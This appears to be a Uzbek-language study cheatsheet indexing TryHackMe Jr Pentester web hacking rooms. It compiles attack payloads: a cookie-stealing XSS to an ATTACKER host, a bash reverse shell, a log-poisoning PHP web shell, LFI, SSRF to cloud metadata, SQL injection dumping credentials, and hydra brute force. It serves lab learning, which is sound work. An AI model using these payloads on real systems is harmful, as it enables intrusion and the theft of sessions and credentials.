# 📚 Introduction to Web Hacking — Mundarija

> **TryHackMe | Jr Pentester | Web Hacking bo'limi**
> Barcha roomlar bo'yicha shaxsiy konspekt va cheatsheet to'plami.

---

## 🗂️ Roomlar Ro'yxati

| # | Room | Asosiy Mavzu | Fayl |
|---|------|--------------|------|
| 01 | 🚶 Walking An Application | Brauzer vositalari, robots.txt, favicon | [01_walking_an_application.md](01_walking_an_application.md) |
| 02 | 🔍 Content Discovery | Gobuster, ffuf, Google Dorks, wordlist | [02_content_discovery.md](02_content_discovery.md) |
| 03 | 🌐 Subdomain Enumeration | DNS, crt.sh, VHost, amass | [03_subdomain_enumeration.md](03_subdomain_enumeration.md) |
| 04 | 🔐 Authentication Bypass | SQL bypass, brute force, cookie tamper | [04_authentication_bypass.md](04_authentication_bypass.md) |
| 05 | 🆔 IDOR | ID o'zgartirish, horizontal/vertical, API | [05_idor.md](05_idor.md) |
| 06 | 📁 File Inclusion | LFI, RFI, path traversal, log poisoning | [06_file_inclusion.md](06_file_inclusion.md) |
| 07 | 🔄 SSRF | Localhost, metadata, blind SSRF, bypass | [07_ssrf.md](07_ssrf.md) |
| 08 | 💻 XSS | Reflected, Stored, DOM, cookie o'g'irlash | [08_xss.md](08_xss.md) |
| 09 | ⚡ Command Injection | OS buyruqlari, blind, reverse shell | [09_command_injection.md](09_command_injection.md) |
| 10 | 🗄️ SQL Injection | UNION, Blind, sqlmap, schema | [10_sql_injection.md](10_sql_injection.md) |
| 11 | 🏁 Race Conditions | TOCTOU, parallel so'rovlar, threading | [11_race_conditions.md](11_race_conditions.md) |

---

## ⚡ Tezkor Cheatsheet — Eng Muhim Buyruqlar

### 🔍 Kontent va Subdomen Topish
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dns -d TARGET.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fc 404
ffuf -u http://TARGET -H "Host: FUZZ.TARGET.com" -w wordlist.txt -fc 404
curl -s "https://crt.sh/?q=%25.TARGET.com&output=json" | jq -r '.[].name_value' | sort -u
```

### 🔐 Autentifikatsiya
```bash
# Username enumeration
ffuf -u http://TARGET/login -X POST -d "username=FUZZ&password=x" -w usernames.txt -mr "exists"

# Brute force
hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SQL bypass (forma ga yozish)
' OR 1=1-- -
admin'-- -
```

### 📁 File Inclusion
```bash
# LFI
?page=../../../etc/passwd
?page=....//....//....//etc/passwd

# PHP wrapper
?page=php://filter/convert.base64-encode/resource=index
?page=data://text/plain,<?php system('id')?>

# Log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
?page=/var/log/apache2/access.log&cmd=id
```

### 🔄 SSRF
```bash
?url=http://127.0.0.1/admin
?url=http://169.254.169.254/latest/meta-data/
?url=http://127.1          # filtr bypass
?url=http://2130706433     # 127.0.0.1 decimal
```

### 💻 XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>document.location='http://ATTACKER/?c='+document.cookie</script>
```

### ⚡ Command Injection
```bash
; id
| whoami
&& id
$(id)
`id`

# Reverse shell
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
nc -lvnp 4444   # tinglovchi
```

### 🗄️ SQL Injection
```sql
-- Sinov
'
1' AND 1=1-- -

-- UNION
' ORDER BY 2-- -
' UNION SELECT 1,database()-- -
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,concat(username,0x3a,password) FROM users-- -

-- SQLMap
sqlmap -u "http://TARGET?id=1" --dbs
sqlmap -u "http://TARGET?id=1" -D dbname -T users --dump
```

### 🏁 Race Conditions
```bash
# Bash parallel
for i in {1..20}; do curl -s -X POST http://TARGET/action -b "session=TOKEN" -d "data=val" & done; wait

# Python threading
import threading, requests
threads = [threading.Thread(target=lambda: requests.post(url, data=data)) for _ in range(20)]
[t.start() for t in threads]; [t.join() for t in threads]
```

---

## 🧠 Zaifliklarni Eslab Qolish Uchun Jadval

| Zaiflik | Nishon | Kalit so'z |
|---------|--------|------------|
| **Content Discovery** | Yashirin sahifalar | `gobuster`, `ffuf`, wordlist |
| **Subdomain Enum** | Yashirin subdomenlar | `crt.sh`, VHost, DNS brute |
| **Auth Bypass** | Login forma | `' OR 1=1-- -`, cookie, brute |
| **IDOR** | ID parametrlar | `?id=1→2`, Base64 decode |
| **LFI** | `?page=` parametr | `../../../etc/passwd` |
| **RFI** | `?page=` parametr | `http://attacker/shell.php` |
| **SSRF** | `?url=` parametr | `127.0.0.1`, `169.254.169.254` |
| **XSS** | Matn chiqaruvchi joy | `<script>`, `onerror=` |
| **Cmd Injection** | Tizim buyrug'i | `; id`, `| whoami` |
| **SQLi** | SQL so'rov | `'`, `UNION SELECT`, sqlmap |
| **Race Condition** | Bir martalik limit | Parallel so'rovlar, threading |

---

## 🔗 Foydali Manzillar

| Resurs | URL | Nima uchun |
|--------|-----|------------|
| TryHackMe | https://tryhackme.com | Mashq platformasi |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Payload to'plami |
| HackTricks | https://book.hacktricks.xyz | Keng qo'llanma |
| GTFOBins | https://gtfobins.github.io | Linux binary bypass |
| PortSwigger | https://portswigger.net/web-security | Web hacking darslar |
| RevShells | https://revshells.com | Reverse shell generator |
| CrackStation | https://crackstation.net | Hash crack |
| CyberChef | https://gchq.github.io/CyberChef | Encode/decode vosita |
| crt.sh | https://crt.sh | SSL sertifikat/subdomen |
| Shodan | https://shodan.io | Internet skaneri |

---

## 📈 O'rganish Yo'li (Learning Path)

```
1. Walking An Application    → Brauzer bilan razvedka
2. Content Discovery         → Yashirin sahifalar topish
3. Subdomain Enumeration     → Keng hujum yuzasi
4. Authentication Bypass     → Tizimga kirish
        ↓
5. IDOR                      → Ma'lumotlarga ruxsatsiz kirish
6. File Inclusion            → Fayl o'qish → RCE
7. SSRF                      → Ichki tarmoqqa kirish
        ↓
8. XSS                       → Foydalanuvchi brauzerini buzish
9. Command Injection         → Server buyruqlari
10. SQL Injection            → Bazani o'qish
        ↓
11. Race Conditions          → Vaqt zaifliklaridan foydalanish
```

---

*Yaratilgan: TryHackMe Jr Pentester — Introduction to Web Hacking bo'limi asosida*
